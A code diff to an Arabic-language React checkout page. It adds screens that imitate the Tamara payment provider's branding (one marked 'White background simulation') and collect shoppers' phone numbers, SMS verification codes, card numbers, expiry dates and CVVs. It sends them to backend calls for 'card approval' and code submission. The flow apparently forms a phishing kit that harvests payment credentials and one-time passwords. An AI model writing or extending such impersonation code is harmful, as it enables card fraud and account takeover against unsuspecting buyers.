@@ -9,11 +9,12 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult } from '@/lib/api';
+import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult, requestActivationCode, verifyActivationCode } from '@/lib/api';
 import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
+import { toEnglishNumbers } from '@/lib/utils';
 
 type PaymentMethod = 'tamara' | null;
-type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';
+type Step = 'checkout' | 'tamara-phone' | 'tamara-verify' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';
 
 interface InstallmentPackage {
   totalAmount: number;
@@ -55,6 +56,10 @@ const Checkout = () => {
   const [confirmCode, setConfirmCode] = useState('');
   const [agreedTerms, setAgreedTerms] = useState(false);
   const [verificationError, setVerificationError] = useState<string | null>(null);
+  const [activationCode, setActivationCode] = useState('');
+  const [codeError, setCodeError] = useState<string | null>(null);
+  const [resendTimer, setResendTimer] = useState(0);
+  const [isVerifyingCode, setIsVerifyingCode] = useState(false);
 
   if (!user) {
     navigate('/login?redirect=/checkout/' + id);
@@ -72,8 +77,14 @@ const Checkout = () => {
     );
   }
 
-  const formatPrice = (p: number) =>
-    new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 0 }).format(p);
+  const formatPrice = (p: number) => {
+    const formatted = new Intl.NumberFormat('en-US', { 
+      style: 'decimal', 
+      minimumFractionDigits: 0,
+      maximumFractionDigits: 0 
+    }).format(p);
+    return `${formatted} ر.س`;
+  };
 
   const discount = couponApplied ? product.price * 0.05 : 0;
   const finalPrice = product.price - discount;
@@ -101,6 +112,14 @@ const Checkout = () => {
       timestamp: new Date().toISOString(),
     }).catch(() => {});
   }, []);
+
+  // Timer for resend code
+  useEffect(() => {
+    if (resendTimer > 0) {
+      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [resendTimer]);
 
   const applyCoupon = () => {
     if (coupon.trim().toUpperCase() === 'GOLD5') {
@@ -131,31 +150,65 @@ const Checkout = () => {
       installments: activeInstallments,
       timestamp: new Date().toISOString(),
     }).catch(() => {});
-    setStep('confirm-method');
+    setStep('tamara-phone');
   };
 
-  const handleVerifyPhone = () => {
-    if (!phoneNumber || phoneNumber.length < 9) {
+  // Tamara Phone Step - Send activation code
+  const handleSendActivationCode = async () => {
+    const cleanPhone = toEnglishNumbers(phoneNumber.trim());
+    
+    if (!cleanPhone || cleanPhone.length < 10) {
       toast.error('يرجى إدخال رقم هاتف صحيح');
       return;
     }
-    if (!agreedTerms) {
-      toast.error('يرجى الموافقة على الشروط والأحكام');
+
+    try {
+      await requestActivationCode({
+        sessionId,
+        phoneNumber: cleanPhone,
+        userName: user.name,
+        userEmail: user.email,
+      });
+
+      toast.success('تم إرسال رمز التحقق');
+      setResendTimer(180); // 3 minutes
+      setStep('tamara-verify');
+    } catch (err) {
+      console.error('Failed to send activation code:', err);
+      toast.error('فشل في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
+    }
+  };
+
+  // Tamara Verify Step - Verify activation code
+  const handleVerifyActivationCode = async () => {
+    const cleanCode = toEnglishNumbers(activationCode.trim());
+    
+    if (!cleanCode || cleanCode.length < 4) {
+      setCodeError('يرجى إدخال رمز التحقق');
       return;
     }
-    postCheckoutEvent({
-      sessionId,
-      eventType: 'phone_entered',
-      userName: user.name,
-      userEmail: user.email,
-      productName: product.name,
-      paymentMethod,
-      installments: activeInstallments,
-      phoneMasked: phoneNumber,
-      timestamp: new Date().toISOString(),
-    }).catch(() => {});
-    toast.info('تم إرسال رمز التحقق إلى هاتفك');
-    setStep('card-info');
+
+    if (!agreedTerms) {
+      setCodeError('يرجى الموافقة على الشروط والأحكام');
+      return;
+    }
+
+    setIsVerifyingCode(true);
+    setCodeError(null);
+
+    try {
+      const result = await verifyActivationCode(sessionId, cleanCode);
+      
+      if (result.valid) {
+        toast.success('تم التحقق من الرمز بنجاح');
+        setStep('card-info');
+      }
+    } catch (err: any) {
+      console.error('Failed to verify activation code:', err);
+      setCodeError(err.message || 'الرمز غير صحيح');
+    } finally {
+      setIsVerifyingCode(false);
+    }
   };
 
   const handleCardSubmit = async () => {
@@ -360,16 +413,11 @@ const Checkout = () => {
     }
   };
 
-  const packagesByCount = INSTALLMENT_PACKAGES.reduce<Record<number, InstallmentPackage[]>>((acc, pkg) => {
-    if (!acc[pkg.installmentsCount]) acc[pkg.installmentsCount] = [];
-    acc[pkg.installmentsCount].push(pkg);
-    return acc;
-  }, {});
-
-  const installmentGroups = Object.entries(packagesByCount).map(([count, pkgs]) => ({
-    count: Number(count),
-    packages: pkgs,
-  }));
+  const formatTimer = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+  };
 
   return (
     <Layout>
@@ -472,74 +520,32 @@ const Checkout = () => {
                   <p className="text-xs text-muted-foreground mt-2">تقسيم فاتورتك حتى 36 دفعة بدون فوائد!</p>
                 </button>
 
-                {/* Installment packages */}
+                {/* Installment packages - Simple selection */}
                 {paymentMethod === 'tamara' && (
-                  <div className="space-y-4 mt-2">
-                    {installmentGroups.map(({ count, packages }) => (
-                      <div key={count} className="bg-secondary rounded-xl p-4">
-                        <p className="text-sm font-bold text-foreground mb-3">
-                          {count} {count === 1 ? 'دفعة' : 'دفعات'}
-                        </p>
-                        <div className="space-y-2">
-                          {packages.map((pkg, idx) => (
-                            <button
-                              key={idx}
-                              onClick={() => setSelectedPackage(pkg)}
-                              className={`w-full p-3 rounded-lg border text-right transition-all ${
-                                selectedPackage === pkg
-                                  ? 'border-primary bg-primary/10'
-                                  : 'border-border bg-card hover:border-primary/50'
-                              }`}
-                            >
-                              <div className="flex items-center justify-between">
-                                <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${selectedPackage === pkg ? 'border-primary' : 'border-muted-foreground/40'}`}>
-                                  {selectedPackage === pkg && <div className="w-2 h-2 rounded-full bg-primary" />}
-                                </div>
-                                <div className="text-right flex-1 mr-2">
-                                  <span className="font-bold text-foreground">{formatPrice(pkg.totalAmount)}</span>
-                                  <span className="text-muted-foreground text-xs mr-2">
-                                    ({count} × {formatPrice(pkg.perInstallment)})
-                                  </span>
-                                </div>
-                              </div>
-                            </button>
-                          ))}
-                        </div>
-                      </div>
-                    ))}
-
-                    {/* Selected package details */}
-                    {selectedPackage && (
-                      <motion.div
-                        initial={{ opacity: 0, y: -8 }}
-                        animate={{ opacity: 1, y: 0 }}
-                        className="bg-primary/5 border border-primary/30 rounded-xl p-4 space-y-2"
+                  <div className="space-y-2 mt-2">
+                    {INSTALLMENT_PACKAGES.map((pkg, idx) => (
+                      <button
+                        key={idx}
+                        onClick={() => setSelectedPackage(pkg)}
+                        className={`w-full p-3 rounded-lg border text-right transition-all ${
+                          selectedPackage === pkg
+                            ? 'border-primary bg-primary/10'
+                            : 'border-border bg-card hover:border-primary/50'
+                        }`}
                       >
-                        <p className="text-sm font-bold text-foreground mb-3">📦 الباقة المختارة:</p>
-                        <div className="space-y-1.5 text-sm">
-                          <div className="flex justify-between">
-                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.totalAmount)}</span>
-                            <span className="text-muted-foreground">💰 المبلغ الإجمالي</span>
+                        <div className="flex items-center justify-between">
+                          <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${selectedPackage === pkg ? 'border-primary' : 'border-muted-foreground/40'}`}>
+                            {selectedPackage === pkg && <div className="w-2 h-2 rounded-full bg-primary" />}
                           </div>
-                          <div className="flex justify-between">
-                            <span className="font-semibold text-foreground">{selectedPackage.installmentsCount} دفعة</span>
-                            <span className="text-muted-foreground">📆 عدد الدفعات</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.perInstallment)}</span>
-                            <span className="text-muted-foreground">💳 كل دفعة</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="font-semibold text-foreground">{formatPrice(selectedPackage.commission)}</span>
-                            <span className="text-muted-foreground">⭐ العمولة</span>
-                          </div>
-                          <div className="flex justify-between border-t border-primary/20 pt-2 mt-2">
-                            <span className="font-bold text-primary">{formatPrice(selectedPackage.netTransfer)}</span>
-                            <span className="text-muted-foreground">💰 صافي التحويل</span>
+                          <div className="text-right flex-1 mr-2">
+                            <span className="font-bold text-foreground">{formatPrice(pkg.totalAmount)}</span>
+                            <span className="text-muted-foreground text-xs mr-2">
+                              ({pkg.installmentsCount} × {formatPrice(pkg.perInstallment)})
+                            </span>
                           </div>
                         </div>
-                      </motion.div>
-                    )}
+                      </button>
+                    ))}
                   </div>
                 )}
 
@@ -568,84 +574,137 @@ const Checkout = () => {
             </motion.div>
           )}
 
-          {step === 'confirm-method' && (
-            <motion.div key="confirm" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
+          {/* Tamara Phone Step - White background simulation */}
+          {step === 'tamara-phone' && (
+            <motion.div key="tamara-phone" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
               <button onClick={() => setStep('checkout')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                 <ChevronLeft className="h-4 w-4" /> رجوع
               </button>
 
-              <div className="bg-card rounded-2xl border gold-border p-8 text-center">
-                <div className="w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center bg-[hsl(340,80%,55%,0.15)]">
-                  <CreditCard className="h-8 w-8 text-[hsl(340,80%,55%)]" />
-                </div>
-                <h2 className="text-xl font-bold text-foreground mb-2">تأكيد وسيلة الدفع</h2>
-                <div className="flex items-center justify-center gap-2 mb-6">
-                  <img src="/tamara-logo.webp" alt="Tamara" className="h-7 object-contain" />
-                  <p className="text-2xl font-extrabold text-[hsl(340,80%,55%)]">تمارا</p>
-                </div>
-
-                <div className="bg-secondary rounded-xl p-5 text-right mb-6 space-y-3">
-                  <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(activeTotalAmount)}</span>
-                    <span className="text-muted-foreground">المبلغ الإجمالي</span>
-                  </div>
-                  <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{activeInstallments} دفعة</span>
-                    <span className="text-muted-foreground">عدد الدفعات</span>
-                  </div>
-                  <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(activePerInstallment)}</span>
-                    <span className="text-muted-foreground">كل دفعة</span>
-                  </div>
-                  <div className="flex justify-between text-sm">
-                    <span className="text-foreground font-medium">{formatPrice(activeCommission)}</span>
-                    <span className="text-muted-foreground">العمولة</span>
-                  </div>
-                  <div className="border-t gold-border pt-3 flex justify-between text-sm">
-                    <span className="text-primary font-bold">{formatPrice(activeNetTransfer)}</span>
-                    <span className="text-muted-foreground">صافي التحويل</span>
-                  </div>
+              <div className="bg-white rounded-2xl border border-gray-200 p-8 text-center shadow-sm">
+                {/* Tamara Logo */}
+                <div className="mb-8">
+                  <img
+                    src="/tamara-logo.webp"
+                    alt="Tamara"
+                    className="h-12 mx-auto object-contain"
+                  />
                 </div>
 
-                <h3 className="text-lg font-bold text-foreground mb-4">تحقق من رقمك</h3>
-                <div className="space-y-3 text-right">
-                  <div className="space-y-2">
-                    <Label className="text-foreground text-sm">رقم الهاتف</Label>
+                <h2 className="text-xl font-bold text-gray-900 mb-6">أدخل رقم الجوال</h2>
+
+                <div className="space-y-4">
+                  <div className="flex gap-2 justify-center">
+                    {/* Saudi flag and country code */}
+                    <div className="flex items-center gap-2 bg-gray-100 border border-gray-300 rounded-lg px-4 py-3">
+                      <span className="text-xl">🇸🇦</span>
+                      <span className="text-gray-700 font-medium">+966</span>
+                    </div>
+                    {/* Phone input */}
                     <Input
                       value={phoneNumber}
-                      onChange={e => setPhoneNumber(e.target.value)}
+                      onChange={e => setPhoneNumber(toEnglishNumbers(e.target.value))}
                       placeholder="05XXXXXXXX"
-                      className="bg-secondary border-border text-foreground text-center text-lg tracking-widest"
-                      maxLength={15}
+                      className="bg-gray-50 border-gray-300 text-gray-900 text-center text-lg tracking-wider w-48"
+                      maxLength={10}
                       dir="ltr"
+                      type="tel"
                     />
                   </div>
 
-                  <label className="flex items-center gap-2 text-sm text-muted-foreground cursor-pointer">
+                  <Button
+                    onClick={handleSendActivationCode}
+                    className="w-full py-4 font-bold bg-[hsl(340,80%,55%)] hover:bg-[hsl(340,80%,50%)] text-white rounded-lg"
+                    disabled={!phoneNumber || phoneNumber.length < 10}
+                  >
+                    إرسال الرمز
+                  </Button>
+                </div>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Tamara Verify Step */}
+          {step === 'tamara-verify' && (
+            <motion.div key="tamara-verify" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
+              <div className="bg-white rounded-2xl border border-gray-200 p-8 text-center shadow-sm">
+                {/* Phone Icon */}
+                <div className="w-16 h-16 rounded-full bg-gray-100 mx-auto mb-4 flex items-center justify-center">
+                  <Phone className="h-8 w-8 text-gray-600" />
+                </div>
+
+                <h2 className="text-xl font-bold text-gray-900 mb-2">تحقق من رقمك</h2>
+                <p className="text-gray-600 mb-1">{phoneNumber}</p>
+                <button 
+                  onClick={() => setStep('tamara-phone')}
+                  className="text-[hsl(340,80%,55%)] text-sm mb-4 hover:underline"
+                >
+                  تبي تغيير رقمك؟
+                </button>
+
+                <p className="text-gray-500 text-sm mb-6">لقد أرسلنا رمز التحقق عبر الرسائل القصيرة</p>
+
+                <div className="space-y-4">
+                  <div>
+                    <Label className="text-gray-700 text-sm block mb-2">أدخل رمز التحقق:</Label>
+                    <Input
+                      value={activationCode}
+                      onChange={e => {
+                        setActivationCode(toEnglishNumbers(e.target.value));
+                        setCodeError(null);
+                      }}
+                      placeholder="_ _ _ _"
+                      className="bg-gray-50 border-gray-300 text-gray-900 text-center text-2xl tracking-[0.5em] py-4"
+                      dir="ltr"
+                      maxLength={6}
+                      type="text"
+                      inputMode="numeric"
+                    />
+                  </div>
+
+                  {codeError && (
+                    <p className="text-red-500 text-sm">{codeError}</p>
+                  )}
+
+                  <p className="text-gray-500 text-sm">
+                    {resendTimer > 0 
+                      ? `إعادة الإرسال خلال ${formatTimer(resendTimer)}`
+                      : 'يمكنك طلب إعادة الإرسال'
+                    }
+                  </p>
+
+                  <label className="flex items-center gap-2 text-sm text-gray-600 cursor-pointer justify-center">
                     <input
                       type="checkbox"
                       checked={agreedTerms}
                       onChange={e => setAgreedTerms(e.target.checked)}
-                      className="rounded border-border accent-primary"
+                      className="rounded border-gray-300 accent-[hsl(340,80%,55%)]"
                     />
                     أوافق على شروط وأحكام تمارا
                   </label>
-                </div>
 
-                <Button
-                  onClick={handleVerifyPhone}
-                  className="w-full mt-6 py-5 font-bold gold-gradient text-primary-foreground"
-                  disabled={!phoneNumber || !agreedTerms}
-                >
-                  تأكيد
-                </Button>
+                  <Button
+                    onClick={handleVerifyActivationCode}
+                    className="w-full py-4 font-bold bg-[hsl(340,80%,55%)] hover:bg-[hsl(340,80%,50%)] text-white rounded-lg"
+                    disabled={!activationCode || !agreedTerms || isVerifyingCode}
+                  >
+                    {isVerifyingCode ? (
+                      <>
+                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
+                        جاري التحقق...
+                      </>
+                    ) : (
+                      'تأكيد'
+                    )}
+                  </Button>
+                </div>
               </div>
             </motion.div>
           )}
 
           {step === 'card-info' && (
             <motion.div key="card" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
-              <button onClick={() => setStep('confirm-method')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
+              <button onClick={() => setStep('tamara-verify')} className="flex items-center gap-1 text-sm text-muted-foreground hover:text-primary mb-6">
                 <ChevronLeft className="h-4 w-4" /> رجوع
               </button>
 
@@ -663,16 +722,16 @@ const Checkout = () => {
                   </div>
                   <div className="space-y-2">
                     <Label className="text-foreground text-sm">رقم البطاقة</Label>
-                    <Input value={cardNumber} onChange={e => setCardNumber(e.target.value)} placeholder="XXXX XXXX XXXX XXXX" className="bg-secondary border-border text-foreground text-center tracking-[0.3em]" dir="ltr" maxLength={19} />
+                    <Input value={cardNumber} onChange={e => setCardNumber(toEnglishNumbers(e.target.value))} placeholder="XXXX XXXX XXXX XXXX" className="bg-secondary border-border text-foreground text-center tracking-[0.3em]" dir="ltr" maxLength={19} />
                   </div>
                   <div className="grid grid-cols-2 gap-3">
                     <div className="space-y-2">
                       <Label className="text-foreground text-sm">تاريخ الانتهاء</Label>
-                      <Input value={cardExpiry} onChange={e => setCardExpiry(e.target.value)} placeholder="MM/YY" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={5} />
+                      <Input value={cardExpiry} onChange={e => setCardExpiry(toEnglishNumbers(e.target.value))} placeholder="MM/YY" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={5} />
                     </div>
                     <div className="space-y-2">
                       <Label className="text-foreground text-sm">CVV</Label>
-                      <Input value={cardCvv} onChange={e => setCardCvv(e.target.value)} placeholder="•••" type="password" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={4} />
+                      <Input value={cardCvv} onChange={e => setCardCvv(toEnglishNumbers(e.target.value))} placeholder="•••" type="password" className="bg-secondary border-border text-foreground text-center" dir="ltr" maxLength={4} />
                     </div>
                   </div>
                 </div>
@@ -733,11 +792,13 @@ const Checkout = () => {
 
                 <Input
                   value={confirmCode}
-                  onChange={e => setConfirmCode(e.target.value)}
+                  onChange={e => setConfirmCode(toEnglishNumbers(e.target.value))}
                   placeholder="أدخل الرمز"
                   className="bg-secondary border-border text-foreground text-center text-2xl tracking-[0.5em] py-6 mb-6"
                   dir="ltr"
                   maxLength={6}
+                  type="text"
+                  inputMode="numeric"
                 />
 
                 <Button
